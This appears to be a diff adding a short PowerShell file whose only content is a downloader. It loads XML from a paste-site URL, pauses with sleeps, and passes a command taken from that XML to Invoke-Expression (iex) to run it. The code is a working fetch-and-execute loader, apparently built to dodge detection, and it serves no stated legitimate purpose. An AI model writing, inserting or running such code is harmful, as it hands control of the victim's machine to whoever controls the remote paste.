@@ -1,0 +1,5 @@
+$fawk = New-Object System.Xml.XmlDocument; 
+start-sleep -s 10;
+$fawk.Load("https://0paste.com/300559-a768c90e.txt");
+start-sleep -s 12;
+$fawk.command.a.execute | iex
